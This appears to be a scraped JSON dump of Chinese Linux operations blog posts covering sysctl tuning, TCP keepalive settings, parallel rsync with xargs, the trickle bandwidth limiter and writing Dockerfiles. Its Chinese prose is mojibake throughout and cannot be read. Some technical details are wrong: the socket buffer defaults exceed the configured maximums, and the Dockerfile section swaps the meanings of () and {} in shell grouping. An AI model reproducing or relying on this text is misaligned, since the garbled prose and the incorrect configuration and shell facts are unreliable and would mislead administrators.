0 42net.ipv4.conf.default.accept_source_route = 0 43 44# Turn on reverse path filtering 45net.ipv4.conf.all.rp_filter = 1 46net.ipv4.conf.default.rp_filter = 1 47 48# Make sure no one can alter the routing tables 49net.ipv4.conf.all.accept_redirects = 0 50net.ipv4.conf.default.accept_redirects = 0 51net.ipv4.conf.all.secure_redirects = 0 52net.ipv4.conf.default.secure_redirects = 0 53 54# Don\u0026#39;t act as a router 55net.ipv4.ip_forward = 0 56net.ipv4.conf.all.send_redirects = 0 57net.ipv4.conf.default.send_redirects = 0 58 59# Number of times SYNACKs for passive TCP connection. 60net.ipv4.tcp_synack_retries = 2 61 62# Allowed local port range 63net.ipv4.ip_local_port_range = 1024 65000 64 65# Protect Against TCP Time-Wait 66net.ipv4.tcp_rfc1337 = 1 67 68# Decrease the time default value for tcp_fin_timeout connection 69net.ipv4.tcp_fin_timeout = 15 70 71# Decrease the time default value for connections to keep alive 72net.ipv4.tcp_keepalive_time = 300 73net.ipv4.tcp_keepalive_probes = 5 74net.ipv4.tcp_keepalive_intvl = 15 75# This means that the keepalive process waits 300 seconds for socket 76# activity before sending the first keepalive probe, and then resend 77# it every 15 seconds. If no ACK response is received for 5 consecutive 78# times (75s in this case), the connection is marked as broken. 79 80### TUNING NETWORK PERFORMANCE ### 81 82# Disable IPv6 83net.ipv6.conf.all.disable_ipv6 = 1 84net.ipv6.conf.default.disable_ipv6 = 1 85net.ipv6.conf.lo.disable_ipv6 = 1 86 87# Default Socket Receive Buffer 88net.core.rmem_default = 31457280 89 90# Maximum Socket Receive Buffer 91net.core.rmem_max = 12582912 92 93# Default Socket Send Buffer 94net.core.wmem_default = 31457280 95 96# Maximum Socket Send Buffer 97net.core.wmem_max = 12582912 98 99# Increase number of incoming connections 100net.core.somaxconn = 5000 101 102# Increase number of incoming connections backlog 103net.core.netdev_max_backlog = 65536 104 105# Enable TCP window scaling 106net.ipv4.tcp_window_scaling = 1 107 108# Increase the maximum amount of option memory buffers 109net.core.optmem_max = 25165824 110 111 112# Increase the maximum total buffer-space allocatable 113# This is measured in units of pages (4096 bytes) 114net.ipv4.tcp_mem = 65536 131072 262144 115net.ipv4.udp_mem = 65536 131072 262144 116 117# Increase the read-buffer space allocatable 118net.ipv4.tcp_rmem = 8192 87380 16777216 119net.ipv4.udp_rmem_min = 16384 120 121# Increase the write-buffer-space allocatable 122net.ipv4.tcp_wmem = 8192 65536 16777216 123net.ipv4.udp_wmem_min = 16384 124 125 126# Increase the tcp-time-wait buckets pool size to prevent simple DOS attacks 127net.ipv4.tcp_max_tw_buckets = 1800000 128 129# TIME_WAIT socket policy 130# Note: if both enabled then disable 131# net.ipv4.tcp_timestamps for servers 132# behind NAT to prevent dropped incoming connections 133#net.ipv4.tcp_tw_recycle = 1 134net.ipv4.tcp_tw_reuse = 1 135 136# Enable TCP MTU probing (in case of Jumbo Frames enabled) 137#net.ipv4.tcp_mtu_probing = 1 138 139# Speedup retrans (Google recommended) 140net.ipv4.tcp_slow_start_after_idle = 0 141net.ipv4.tcp_early_retrans = 1 142 143# Conntrack 144# 288bytes x 131072 = 37748736 (~38MB) max memory usage 145#net.netfilter.nf_conntrack_max = 131072 146#net.netfilter.nf_conntrack_tcp_loose = 1 147 148#TCPçš„ç›´æ¥æ‹¥å¡é€šå‘Š(tcp_ecn)å…³æ‰ 149net.ipv4.tcp_ecn = 0 150 151#è·¯ç”±ç¼“å­˜åˆ·æ–°é¢‘ç‡ï¼Œå½“ä¸€ä¸ªè·¯ç”±å¤±è´¥åå¤šé•¿æ—¶é—´è·³åˆ°å¦ä¸€ä¸ªè·¯ç”±ï¼Œé»˜è®¤æ˜¯300ã€‚ 152net.ipv4.route.gc_timeout = 100 153 154#è®¾å®šç³»ç»Ÿä¸­æœ€å¤šå…è®¸åœ¨å¤šå°‘TCPå¥—æ¥å­—ä¸è¢«å…³è”åˆ°ä»»ä½•ä¸€ä¸ªç”¨æˆ·æ–‡ä»¶å¥æŸ„ä¸Šã€‚ 155#å¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œæ²¡æœ‰ä¸ç”¨æˆ·æ–‡ä»¶å¥æŸ„å…³è”çš„TCP å¥—æ¥å­—å°†ç«‹å³è¢«å¤ä½ 156#é˜²ç®€å•Dos 157net.ipv4.tcp_max_orphans = 655360 158 159# NOTE: Enable this if machine support it 160# -- 10gbe tuning from Intel ixgb driver README -- # 161# turn off selective ACK and timestamps 162#net.ipv4.tcp_sack = 0 163#net.ipv4.tcp_timestamps = 1 ** æ³¨æ„ï¼Œnet.ipv4.tcp_tw_recycle ä¸è¦æ‰“å¼€ï¼Œåœ¨ NAT ç¯å¢ƒä¸­ä¼šå‡ºé”™ï¼Œè€Œä¸”åœ¨ K8S ä¸­ä¹Ÿä¼šå›  NAT å¯¼è‡´ pod å‡ºé”™ï¼Œåˆ‡è®°ï¼ï¼ï¼**\n","date":"2021-11-02","img":"","permalink":"https://rendoumi.com/posts/20211102-sysctl_conf/","series":null,"tags":null,"title":"Linuxå†…æ ¸sysctlå†…æ ¸å‚æ•°ä¼˜åŒ–"},{"categories":null,"content":"Custom Configuration of TCP Socket Keep-Alive Timeouts è¿™æ˜¯ä¸ªå¤è€çš„è¯é¢˜ï¼Œæˆ‘ä»¬åœ¨æœºå™¨çš„ä¼˜åŒ–ä¸­ï¼Œéœ€è¦è®¾ç½® TCP Socket çš„ Timeout å‚æ•°\nç”¨æ¥åŠ å¿« TCP å…³é—­æ— ç”¨é—²ç½®è¿æ¥çš„æ—¶é—´\nLinux å†…æ ¸ä¸­æœ‰ä¸‰ä¸ªç¼ºçœå‚æ•°:\n1 tcp_keepalive_time ç¼ºçœæ˜¯ 7200 ç§’ 1 tcp_keepalive_probes ç¼ºçœæ˜¯ 9 1 tcp_keepalive_intvl ç¼ºçœæ˜¯ 75 ç§’ å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š\nä¸€ã€å®¢æˆ·ç«¯æ‰“å¼€ä¸€ä¸ª TCP socket è¿æ¥ï¼Œå¼€å§‹è·ŸæœåŠ¡å™¨é€šè®¯\näºŒã€å¦‚æœè¿™æ¡ socket è¿æ¥ç©ºé—²æ²¡æœ‰ä»»ä½•æ•°æ®ä¼ è¾“ï¼Œé™é»˜äº† tcp_keepalive_time ç§’åï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ä¼šä¸»åŠ¨å‘é€ä¸€ä¸ªç©ºçš„ ACK åŒ…åˆ°æœåŠ¡å™¨\nä¸‰ã€é‚£ä¹ˆï¼Œæ ¹æ®æœåŠ¡å™¨æ˜¯å¦å›åº”äº†ä¸€ä¸ªç›¸åº”çš„ ACK åŒ…æ¥åˆ¤æ–­\n1ACK æœªå›åº” ç­‰å¾… tcp_keepalive_intvl ç§’ï¼Œç„¶åå†å‘ä¸€ä¸ª ACK åŒ… é‡å¤ä»¥ä¸Šç­‰å¾…å¹¶å‘é€ ACK åŒ…çš„è¿‡ç¨‹ï¼Œç›´åˆ°æ¬¡æ•°ç­‰äº tcp_keepalive_probes å¦‚æœç¬¬2æ­¥åšå®Œè¿˜æ”¶ä¸åˆ°ä»»ä½•å›åº”ï¼Œå‘é€ä¸€ä¸ª RST åŒ…å¹¶å…³é—­è¿æ¥ å›åº”äº†: å›åˆ°ä¸Šè¿°ç¬¬äºŒæ­¥ é‚£ä¹ˆç¼ºçœæƒ…å†µä¸‹ï¼Œ7200+75Ã—9ï¼Œä¸€ä¸ªæ²¡æœ‰ä»»ä½•æ•°æ®ä¼ è¾“çš„ socket æ‰ä¼šè¢«å…³é—­ï¼Œå¤§æ¦‚æ˜¯2å°æ—¶11åˆ†é’Ÿã€‚\nè¿™ä¸ªæ—¶é—´å¤ªé•¿äº†ã€‚éœ€è¦ä¼˜åŒ–ä¸€ä¸‹ï¼š\n1net.ipv4.tcp_keepalive_time = 300 2net.ipv4.tcp_keepalive_probes = 5 3net.ipv4.tcp_keepalive_intvl = 15 ä¸Šé¢çš„æ—¶é—´æ˜¯ 300 + 5x15ï¼Œå¤§æ¦‚æ˜¯6åˆ†é’Ÿï¼Œå¤§å¤§ç¼©çŸ­é‡Šæ”¾ç©ºé—² socket çš„æ—¶é—´\n","date":"2021-11-02","img":"","permalink":"https://rendoumi.com/posts/20211102-tcp_keealive/","series":null,"tags":null,"title":"Linuxå†…æ ¸TCPè¿æ¥Keep-Alive Timeoutçš„é…ç½®"},{"categories":null,"content":"è¿™å±äºShellçš„é«˜çº§æŠ€å·§äº†ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åœ¨ bash ä¸­å¹¶å‘ wget rsync æ–‡ä»¶ï¼Œä¸‹é¢å°±è®¨è®ºä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚\né¦–å…ˆä»ç®€å•çš„å•çº¿ç¨‹å¼€å§‹ï¼š\n1$ for i in $(seq 1 2); do echo $i; done 21 32 å¯ä»¥çœ‹åˆ°æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œä¸‹é¢å˜å¤šçº¿ç¨‹ï¼š\n1$ for i in $(seq 1 2); do echo $i \u0026amp; done 2[1] 245505 31 4[2] 245506 52 6[1] Done echo $i 7[2] Done echo $i å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªæŠŠ ; å·æ”¹æˆäº† \u0026amp; å·ï¼Œç¨‹åºå°±å˜æˆäº†å¤šçº¿ç¨‹æ‰§è¡Œã€‚\nåŒºåˆ«åœ¨äº ; å·ä¼šç­‰å¾…ä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œå®Œæ¯•å†æ‰§è¡Œä¸‹ä¸€æ¡ï¼Œè€Œ \u0026amp; ä¸ç­‰å¾…ï¼Œç›´æ¥ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡ï¼›ç›¸å½“äºåå°è¿è¡Œäº†å‰ä¸€æ¡å‘½ä»¤ã€‚\nä¸‹é¢è¯´è¯´ find çš„å•çº¿ç¨‹å’Œå¤šçº¿ç¨‹ï¼š\nfind çš„ exec ç”¨æ³•\n1$ find /path [args] -exec [cmd] {} \\; {} å ä½ç¬¦å·ï¼Œå­˜æ”¾findæ‰¾åˆ°çš„è®°å½• ; å¯¹äºæ¯ä¸€æ¡æ‰¾åˆ°çš„å•ç‹¬è®°å½•ï¼Œæ‰§è¡Œçš„cmdæ˜¯ä¸€æ¡ä¸€æ¡å•ç‹¬æ‰§è¡Œçš„ æ‰§è¡Œçš„é¡ºåºå¦‚ä¸‹: cmd result1; cmd result2; \u0026hellip;; cmd result N 1$ find /path [args] -exec [cmd] {} \\+ {} å ä½ç¬¦å·ï¼Œå­˜æ”¾findæ‰¾åˆ°çš„è®°å½• + å¯¹äºæ‰¾åˆ°çš„æ‰€æœ‰è®°å½•ï¼Œæ‰§è¡Œçš„cmdæ˜¯åˆå¹¶äº†æ‰€æœ‰è®°å½•é›†æ‰§è¡Œçš„ æ‰§è¡Œé¡ºåºå¦‚ä¸‹: cmd result1 result2 \u0026hellip; result N å¤šä¸ªexecå¯ä»¥ä¸²èµ·æ¥ï¼š\n1$ find /tmp/dir1/ -type f -exec grep howtouselinux {} \\; -exec echo {} \\; | sed \u0026#39;s/howtouselinux/deep/g\u0026#39; è‡³æ­¤ï¼Œfind ä¹Ÿè¿˜æ˜¯å•çº¿ç¨‹æ‰§è¡Œçš„ï¼Œå¹¶æ²¡æœ‰å¹¶å‘ã€‚\nfind è¦å¹¶å‘ï¼Œå°±åªèƒ½è·Ÿ xargs ç»“åˆåœ¨ä¸€èµ·ï¼š\nxargs é€šå¸¸é…åˆç®¡é“ä½¿ç”¨ï¼Œå°†å‰é¢å‘½ä»¤äº§ç”Ÿçš„å‚æ•°ï¼Œé€ä¸ªä¼ å…¥åç»­å‘½ä»¤ï¼Œä½œä¸ºå‚æ•°ã€‚xargs ä¼ æ¥çš„å‚æ•°ï¼Œé»˜è®¤ä½äº xargs åé¢å‘½ä»¤çš„æœ€åï¼Œå¦‚æœè¦æ”¹å˜ä½ç½®ï¼Œéœ€è¦ç”¨**-I**å‚æ•°ã€‚xargs å¦‚æœä¸å¸¦å‘½ä»¤ï¼Œç¼ºçœæ˜¯ echo\n-d åˆ†éš”ç¬¦\n1$ echo -e \u0026#34;a\\tb\\tc\u0026#34; | xargs -d \u0026#34;\\t\u0026#34; echo 2a b c -I{} æŒ‡å®šå ä½ç¬¦ï¼Œ-I %é‚£å°±æ˜¯ % æ›¿ä»£ä»ä¹‹å‰ç®¡é“å–å¾—çš„å‚æ•°\n1$ find . -type d | xargs -I % -0 rsync -auvPR % 192.168.1.38::new/ -0 è·Ÿfindçš„-print0é…åˆï¼Œfindå‘½ä»¤æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å‚æ•°-print0ï¼ŒæŒ‡å®šè¾“å‡ºçš„æ–‡ä»¶åˆ—è¡¨ä»¥nullåˆ†éš”ã€‚ç„¶åï¼Œxargså‘½ä»¤çš„-0å‚æ•°è¡¨ç¤ºç”¨nullå½“ä½œåˆ†éš”ç¬¦ã€‚\n1$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -I % -0 rsync -auvPR % 172.18.34.38::new/ -P æœ€å¤§å¹¶å‘çº¿ç¨‹æ•°ï¼Œä¸‹é¢æ˜¯å¹¶å‘30çº¿ç¨‹\n1$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -I % -0 rsync -auvPR % 172.18.34.38::new/ -n é€‰é¡¹é™åˆ¶å•ä¸ªå‘½ä»¤è¡Œçš„å‚æ•°ä¸ªæ•°ï¼Œä¸‹é¢æ˜¯ rsync ä¸€è¡Œå‘½ä»¤ä¼ å¸¦60ä¸ªæ–‡ä»¶ï¼Œ30ä¸ªè¿›ç¨‹é‚£å°±æ˜¯30ä¸ª rsyncï¼Œæ¯ä¸ª rsync åŒæ—¶ä¼ 60ä¸ªæ–‡ä»¶ã€‚\n1$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -n 60 -I % -0 rsync -auvPR % 172.18.34.38::new/ 2 3$ echo {0..10} | xargs -I{} -n 2 40 1 52 3 64 5 76 7 88 9 910 ä½¿ç”¨ bash -c å¹¶å‘çš„ä¾‹å­ï¼š\n1$ time for i in $(seq 1 5); do echo $[$RANDOM % 5 + 1]; done | xargs -I{} echo \u0026#34;sleep {}; echo \u0026#39;Done! {}\u0026#39;\u0026#34; | xargs -P5 -I{} bash -c \u0026#34;{}\u0026#34; ","date":"2021-10-29","img":"","permalink":"https://rendoumi.com/posts/20211029-bash_multithread/","series":null,"tags":null,"title":"Shellä»¥åŠfindçš„å¤šçº¿ç¨‹æ‰§è¡Œ"},{"categories":null,"content":"ä¹‹å‰è®²è¿‡å¦‚ä½•å¯¹ opnvpn æ€»ä½“é™é€Ÿï¼Œè¿™æ¬¡æ¥äº†ä¸€ä¸ªæ›´ä¸¥æ ¼çš„ç¨‹åºé™é€Ÿéœ€æ±‚ï¼š\nåœºæ™¯å¦‚ä¸‹ï¼š\nä¸¤ä¸ªæœºæˆ¿é—´æœ‰ä¸€æ¡ä¸“çº¿ 100M\nä¸¤ä¸ªæœºæˆ¿é—´éœ€è¦åŒæ­¥æ•°æ®ï¼ŒåŒæ­¥éœ€è¦é™åˆ¶åˆ°60Mï¼Œç»™åˆ«çš„ç¨‹åºç•™å‡ºå¸¦å®½ç©ºé—´\nä¼ è¾“æ˜¯å¤šä¸ªæ–‡ä»¶ï¼Œç”¨ rsync å¹¶å‘ä¼ é€\nåˆ†æäº†ä¸€ä¸‹è„šæœ¬çš„æ ¸å¿ƒéƒ¨åˆ†\n1find . -type f | grep $(date -d\u0026#34;-1 day\u0026#34; +\u0026#39;%Y%m%d\u0026#39;) |xargs -I % -P 30 rsync -auvPR % 192.168.9.17::mysql å‘ç°æ˜¯åˆ©ç”¨ xargs çš„å¹¶å‘ï¼Œ-P 30 æœ€å¤§å¹¶å‘30ä¸ªï¼Œå¯åŠ¨äº† rsync åŒæ­¥\nrsync æ²¡æœ‰é™é€Ÿï¼Œè¿™å°±éº»çƒ¦äº†ã€‚\nä¸€ã€å•æ–‡ä»¶å•ç‹¬é™é€Ÿ é¦–å…ˆæ˜¯ä½¿ç”¨ rsync çš„ \u0026ndash;bwlimit=600 å‚æ•°ï¼ŒæŠŠé€Ÿåº¦é™åˆ¶ä¸º 600KB/s ï¼Œ600Ã—8=4800ï¼Œå•è¿›ç¨‹åŸºæœ¬æ˜¯5Mçš„é€Ÿåº¦ï¼Œæœ€å¤šåªèƒ½è·‘12ä¸ªäº†ï¼Œå°±ä¼šè·‘åˆ°60Mã€‚\nè¿™æ ·ä¹Ÿä¸å¤ªå¯¹ï¼Œå°¤å…¶æ˜¯ rsync å¹¶å‘è¿›ç¨‹é€æ¸å‡å°‘ï¼Œå°‘äº12ä¸ªçš„æ—¶å€™ï¼Œè¿™æ ·å°±å‡ºç°è·‘ä¸æ»¡60Mçš„ç°è±¡ã€‚\näºŒã€å¤šæ–‡ä»¶æ•´ä½“é™é€Ÿ é‚£ä¹ˆ rsync æ”¯æŒå¤šæ–‡ä»¶ä¼ è¾“ ï¼Œä½¿ç”¨å¦‚ä¸‹æ ¼å¼æ•´ä½“é™é€Ÿ\n1rsync --bwlimit=7200 -auvPR æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 192.168.9.17::mysql é—®é¢˜åˆæ¥äº†ï¼Œæ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 çš„è·¯å¾„éå¸¸é•¿ï¼Œè€Œæ–‡ä»¶ä¸ªæ•°ä¸å®šï¼Œæœ‰æ’‘çˆ†å‘½ä»¤è¡Œå•è¡Œé•¿åº¦é™åˆ¶çš„å¯èƒ½ï¼Œä¹Ÿä¸å¯è¡Œ\nä¸‰ã€tc ä½¿ç”¨ tc å¯ä»¥æ§åˆ¶æºipæˆ–è€…ç›®çš„ipçš„å¸¦å®½ï¼Œä½†æ˜¯æœ¬æœºç½‘å¡æ˜¯ä¸‡å…†å…‰å¡ï¼Œç”Ÿäº§ç¯å¢ƒï¼Œæ¯æ—¶æ¯åˆ»éƒ½æœ‰æ•°æ®è¯»å†™ã€‚\nä¸€æ—¦é”™äº†ï¼Œå°±ç›´æ¥å®Œè›‹äº†ã€‚ä¹Ÿä¸å¤ªå¯è¡Œ\nå››ã€æ€å™¨trickle å¯»æ‰¾äº†åŠå¤©ï¼Œç»ˆäºæ‰¾åˆ°äº†ä¸ªå¤§æ€å™¨trickleï¼Œå¯ä»¥å¯¹ç¨‹åºå•ç‹¬é™é€Ÿï¼Œä¹Ÿå¯ä»¥å¯¹ä¸€å †ç¨‹åºæ•´ä½“é™é€Ÿ\nå®‰è£…ï¼š\n1$ yum install -y epel-release 2$ yum install trickle å‚æ•°è§£é‡Šï¼š\n-u ä¸Šè½½é€Ÿåº¦ KB/s ï¼Œä¹˜ä»¥8æ¢ç®—æˆç½‘ç»œé€Ÿåº¦ -d ä¸‹è½½é€Ÿåº¦ KB/s ï¼Œä¹˜ä»¥8æ¢ç®—æˆç½‘ç»œé€Ÿåº¦ -s standaloneç‹¬ç«‹æ¨¡å¼ï¼Œä¸å‚ä¸ trickled çš„æ•´ä½“æ¨¡å¼ å¦‚æœè¦å¯¹ä¸€ä¸ªç¨‹åºå•ç‹¬é™é€Ÿï¼Œ10KB\n1trickle -s -u 10 -d 10 wget http://mirrors.163.com/rocky/8/isos/x86_64/Rocky-8.4-x86_64-dvd1.iso wget çš„ä¸‹è½½å®Œå…¨è¢«é™åˆ¶åœ¨äº†10KB\nå¦‚è¿‡è¦å¯¹ä½¿ç”¨trickleçš„æ‰€æœ‰ç¨‹åºåšæ•´ä½“é™é€Ÿ\n1# é¦–å…ˆå¯åŠ¨å®ˆæŠ¤è¿›ç¨‹ trickled 2$ trickled -u 7200 -d 7200 3 4# ç„¶åæ‰€æœ‰ç”¨trickleæ‰§è¡Œçš„å‘½ä»¤å°±ä¼šæ•´ç†é™é€Ÿåœ¨7200KB/s ï¼ˆç½‘ç»œé€Ÿåº¦60Mï¼‰ 5find . -type f | grep $(date -d\u0026#34;-1 day\u0026#34; +\u0026#39;%Y%m%d\u0026#39;) |xargs -I % -P 30 trickle rsync -auvPR % 192.168.9.17::mysql ","date":"2021-10-28","img":"","permalink":"https://rendoumi.com/posts/20211028-trickle/","series":null,"tags":null,"title":"Linuxä¸‹çš„ç¨‹åºé™é€Ÿè½¯ä»¶Trickle"},{"categories":null,"content":"Dockerfile æ˜¯é€ å‡ºé•œåƒçš„åŸºç¡€ï¼Œæ˜¯å¿…é¡»ç†ŸçŸ¥å¹¶äº†è§£çš„çŸ¥è¯†ï¼š\nä¸€ã€ç¼–å†™Dockerfile å…ˆç»™ä¸ªä¾‹å­ï¼Œæ˜¯ minio ä»£ç†è®¿é—®é˜¿é‡Œçš„ OSS\n1FROM alpine:3.12 2 3RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* 4 5COPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z 6 7ENV MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb 8ENV MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y 9 10WORKDIR /data 11EXPOSE 9000 12 13CMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] 14# CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; è¯¦ç»†è§£é‡Šæ¯ä¸€æ¡è¯­å¥ï¼š\nFROM\nåŸºæ¿ï¼Œalpine 3.12 æ˜¯ä¸ªæ¯”è¾ƒå¾®å°çš„ç‰ˆæœ¬ï¼Œæ³¨æ„å®ƒçš„æ¯›ç—…ï¼Œ/bin/shå…¶å®æ˜¯busyboxï¼Œæ²¡æœ‰/bin/bashï¼ŒæŸäº›bashçš„å‡½æ•°åŠŸèƒ½æ”¯æŒä¸å…¨ï¼Œæ¯”å¦‚forå¾ªç¯\nRUN\nåœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤ï¼Œä¸Šä¾‹ä¸­æˆ‘ä»¬æ·»åŠ äº† bash ï¼Œå¹¶æ¸…ç†äº†ç¼“å­˜ã€‚å‘½ä»¤é—´ç”¨ \u0026amp;\u0026amp; å¯ä»¥é¿å…é•œåƒè¿‡å¤šåˆ†å±‚ã€‚\nRUNåˆ†ä¸¤ç§æ¨¡å¼shellå’Œexecæ¨¡å¼:\næˆ‘ä»¬åªç”¨ exec æ¨¡å¼ï¼Œå› ä¸ºåœ¨ image é‡Œè£…å…¥å¤šä¸ª shellï¼Œæ²¡ä»€ä¹ˆæ„ä¹‰ã€‚\nCOPY å’Œ ADD\nä½œç”¨éƒ½æ˜¯å°†æ–‡ä»¶æˆ–ç›®å½•å¤åˆ¶åˆ° Dockerfile æ„å»ºçš„é•œåƒä¸­\næˆ‘ä»¬åªç”¨COPYï¼Œå¦‚æœé‡åˆ°è¦æŠŠURLçš„æ–‡ä»¶æ”¾è¿›å»ï¼Œå¯ä»¥å…ˆwgetï¼Œç„¶åæ”¾ï¼›å¦‚æœè¦è§£å‹tarråŒ…æ”¾è¿›å»ï¼Œé‚£å°±å…ˆè§£å‹å†æ”¾ã€‚\næ³¨æ„æºæ–‡ä»¶è·¯å¾„éƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œç›®æ ‡è·¯å¾„ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚\nå¦‚æœdestä¸æŒ‡å®šç»å¯¹è·¯å¾„ï¼Œåˆ™æ˜¯æƒ³å¯¹äºWORDIRçš„ç›¸å¯¹è·¯å¾„\nCMD å…¥å£\nç”¨ [] åˆ†å‰²ï¼Œ æŠŠæ‰€æœ‰ \u0026quot;\u0026quot; çš„éƒ¨åˆ†åˆå¹¶ä¸ºä¸€è¡Œï¼Œä¸­é—´ç”¨ç©ºæ ¼éš”å¼€æ‰§è¡Œï¼›æˆ–è€…ç›´æ¥ä¸€è¡Œæ²¡ä»»ä½•åˆ†å‰²ç¬¦ã€‚\næ‰€ä»¥ä¸Šé¢çš„ä¾‹å­å°±æ˜¯æ‰§è¡Œäº†ä¸€å¥ï¼š\n1/data/minio.RELEASE.2020-04-15T19-42-18Z gateway oss http://oss-cn-shanghai-internal.aliyuncs.com æŠ€å·§ï¼š\næŠŠå‡ ä¸ªå‘½ä»¤åˆåœ¨ä¸€èµ·æ‰§è¡Œ\n()è¡¨ç¤ºåœ¨å½“å‰shellåˆå¹¶æ‰§è¡Œ\n{}è¡¨ç¤ºæ´¾ç”Ÿå‡ºä¸€ä¸ªå­shellï¼Œåœ¨å­shellä¸­åˆå¹¶æ‰§è¡Œï¼Œ{ echo \u0026ldquo;aaa\u0026rdquo; }å¿…é¡»æœ‰ç©ºæ ¼\n\u0026amp;è¡¨ç¤ºåå°è¿è¡Œ\nå‘½ä»¤ä¹‹é—´ä½¿ç”¨ \u0026amp;\u0026amp; è¿æ¥ï¼Œå®ç°é€»è¾‘ä¸çš„åŠŸèƒ½ã€‚\nåªæœ‰åœ¨ \u0026amp;\u0026amp; å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œ\u0026amp;\u0026amp; å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œã€‚ åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œã€‚ \u0026amp;\u0026amp;å·¦è¾¹çš„å‘½ä»¤ï¼ˆå‘½ä»¤1ï¼‰è¿”å›çœŸ(å³è¿”å›0ï¼ŒæˆåŠŸè¢«æ‰§è¡Œï¼‰åï¼Œ\u0026amp;\u0026amp;å³è¾¹çš„å‘½ä»¤ï¼ˆå‘½ä»¤2ï¼‰æ‰èƒ½å¤Ÿè¢«æ‰§è¡Œï¼›æ¢å¥è¯è¯´ï¼Œâ€œå¦‚æœè¿™ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸ\u0026amp;\u0026amp;é‚£ä¹ˆæ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤â€ã€‚\næœ€ä¸‹çš„è¯­æ³•ç”¨äº†seqè€Œä¸æ˜¯forå¾ªç¯ï¼Œæ˜¯å› ä¸ºbusyboxçš„shä¸æ”¯æŒforè¯­æ³•\næ‰€ä»¥æ‰æœ‰å¦‚æ­¤æ€ªå¼‚çš„è¯­æ³•ï¼Œåœ¨å®¹å™¨ä¸­åå°è·‘10ä¸ªphp think queueï¼Œ1ä¸ªcrondï¼Œå‰å°è·‘ä¸€ä¸ªphp-fpmï¼š\n1CMD for i in $(seq 10); do (php think queue \u0026amp;) ; done \u0026amp; crond \u0026amp;\u0026amp; php-fpm ARG å‚æ•°\nARG VERSION=7.6.1\nå®šä¹‰åå¯ä»¥ç”¨${VERSION}å¼•ç”¨ï¼Œbuildçš„æ—¶å€™å¯ä»¥åŠ \u0026ndash;build-arg ä¼ å‚æ•°è¿›å»\n1docker build --build-arg VERSION=${LATEST} -t $(ORG)/$(NAME):$(BUILD) . è¿˜æœ‰å¾ˆå¤š Build çš„æŠ€å·§ï¼Œå¦‚æœé€ ä¸€ä¸ª go è¯­è¨€ç¼–è¯‘ç¯å¢ƒçš„ä¸­é—´å±‚é•œåƒï¼Œç„¶åé€ æœ€ç»ˆé•œåƒã€‚\nä½†æ˜¯å…«æˆ’è¿˜æ˜¯æ¨èç›´æ¥é€ å‡ºäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åç›´æ¥æ‹·è´è¿›å»å°±å¥½ï¼Œä¸è¦å¼„çš„è¿‡äºéº»çƒ¦ï¼Œä¸­é—´å±‚é‚£ç§é€‚ç”¨äºç”¨æºç  CI/CD ä¸­æ— ç¼–è¯‘ç¯å¢ƒçš„æƒ…å†µã€‚\näºŒã€è°ƒè¯•å®¹å™¨ å¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬é€ å¥½äº† image ï¼Œä¸€è·‘å°±æ‰ä¸‹æ¥äº†ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆæƒ…å†µ\nè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æŠŠ CMD æ¢æˆä¸€ä¸ª sh æ‰§è¡Œä¸€ä¸ªæ­»å¾ªç¯\n1CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; ç„¶åè¿›å…¥å®¹å™¨ï¼Œç„¶åå†æ‰§è¡Œä¹‹å‰çš„ CMD å‘½ä»¤ï¼Œçœ‹çœ‹æŠ¥é”™ä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Œå°±å¯ä»¥è°ƒè¯•äº†\n1$ docker exec -it 89174asklja /bin/sh ä¸‰ã€podçš„ç­‰å¾…æŠ€å·§ è¿™é‡Œå¯åŠ¨æ­£å¼çš„podä¹‹å‰ï¼Œå…ˆä¸´æ—¶èµ·äº†ä¸¤ä¸ªå®¹å™¨ç­‰å¾…å…¶ä»–æœåŠ¡çš„å®Œæˆ\n1 containers: 2 - name: myapp-container 3 image: busybox 4 command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo The app is running! \u0026amp;\u0026amp; sleep 3600\u0026#39;] 5 initContainers: 6 - name: init-myservice 7 image: busybox 8 command: 